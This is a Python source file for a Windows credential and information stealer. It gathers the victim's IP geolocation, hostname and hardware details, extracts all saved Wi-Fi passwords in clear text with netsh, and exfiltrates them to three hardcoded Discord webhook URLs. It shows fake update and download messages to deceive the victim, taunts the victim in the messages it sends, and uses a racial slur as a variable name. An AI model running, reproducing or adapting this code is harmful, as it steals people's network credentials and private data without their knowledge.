import io #module is used for writing on files
import subprocess # to access certain cmds like netsh
import requests as pp #request used for scraping js websites
import os as op #os is just op
import webbrowser as poop #rickroll and SP :)
import socket as poggchamp #getting hostname not nessecary can remove
from dhooks import Webhook, File #sending webhooks
import platform as halal #getting host names 
import wmi # more info from windows (only works with windows)


op.system("color 0a") #cool color in windows cmd
fname = "holyshit.txt" #saves the ip data as txt files

whobedum = poggchamp.gethostname() # gets the host name using socket module
mynigga = halal.uname() #using the platform module grabs usefull info about host pc.
windowsop = wmi.WMI() #using the wmi platform grab info about the windows pc.
macsuxs = windowsop.Win32_ComputerSystem()[0] #Win32 module from wmi

Wbhook_wifi = Webhook("https://discord.com/api/webhooks/880554721922916402/1OL1oEL7pLryhFkGrCl7lNR5xethn5gms8JlEpRHbM-kVQwwutuZ7F00aq-a43pJcSHz")#wifipass gets dumped here
Wbhook_nowifi = Webhook("https://discord.com/api/webhooks/880554730462535751/TVU-jyTKMLkqE3BqXBE3xHMvEMRj-iX-5TXVaYkxfzYMYxrHkRh8kQn_tcjupCaKk9JU") #nowifipass get dumped here
Wbhook_ip = Webhook("https://discord.com/api/webhooks/880516595670192208/7H7vG-feqnASTWD8VyZzv2uBHo1y3zJ8dtANpVW6e1qcUcAgvmmuoduf9EGarg00nKk7") #ip data gets dumped here( using discord as a platform)
x = pp.get("http://ip-api.com/json") #request module to scrape ip from ;;
data = str(x.json()) #making scraped data str and json 
print("Downloading Modules")

with io.open(fname, 'w', encoding="utf-8") as pog:
    pog.write(data) #writes the holyshit.txt file 


# Following is the Message which goes in the first ip dump
Wbhook_ip.send(f'''

**--------------------------GRABBED_INFO-----------------------------**
Hello There Young Lad,
This is Hecker From Dark Web.
Lmao just take the ip and get lost baibai. 
@everyone

https://github.com/abhinav-ranish
https://abhinavranish.gq
-------------------------------------------------------------------
AbhiQ Grabber= 
```yaml
---------------------------Precise Info---------------------------
{data}

---------------------------------------------------------------------
```
Hostname = {whobedum}
---------------------------------------------------------------------
**---------------------------System Info-----------------------------**
System = {mynigga.system}
Node Name = {mynigga.node}
Release = {mynigga.release}
Machine = {mynigga.machine}
Processor = {mynigga.processor}
Version = {mynigga.version}
-------------------------------------------------------------------
**----------------------------Windows PC----------------------------**
Manufacturer = {macsuxs.Manufacturer}
Model = {macsuxs. Model}
Name = {macsuxs.Name}
NumberOfProcessors = {macsuxs.NumberOfProcessors}
SystemType = {macsuxs.SystemType}
SystemFamily = {macsuxs.SystemFamily}
-------------------------------------------------------------------
CC@ https://github.com/abhinav-ranish
-------------------------------------------------------------------

'''
)

#Nowifi dump and since its on another channel creates a sub heading for new victims

Wbhook_nowifi.send(f"**Hostname = {whobedum}**")
Wbhook_wifi.send(f"**Node Name = {mynigga.node}**  **Name = {macsuxs.Name}** ")

print("downloading python==1.39 -------------------/------------") #some fake shit like a pro gamer


data = subprocess.check_output(['netsh', 'wlan', 'show', 'profile']).decode('utf-8').split('\n') #uses subprpocess module to acess windows cmds like netsh etc.
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
for i in profiles:
    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n') #use netsh windows network manager tool to see wifi pass in clear.
    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b ]
    try:
        Wbhook_wifi.send ("{:<30}|   {:<}".format(i,results[0])) #sends wifi uname and psswd in a order
    except IndexError:
        Wbhook_nowifi.send ("{:<30}|   {:<}".format(i, "")) #send open wifis
    except:
        print("Errors Found") #overules any errors and doesnt kill the code


print("Checking For Updates") #fake shit :)

print("Scanning....") #more fake shit

print("Enjoy Life Beta.") #enjoy ur life beta

input("Enter To See Results!") #rickrolls the person when click any button


poop.open_new_tab("https://abhinavranish.gq")#my website
poop.open_new_tab("https://github.com/abhinav-ranish")#my github
poop.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")#rickroll link

print("Noob Gamer Get Rolled. For More Visit abhinaranish.gq")#fake shit


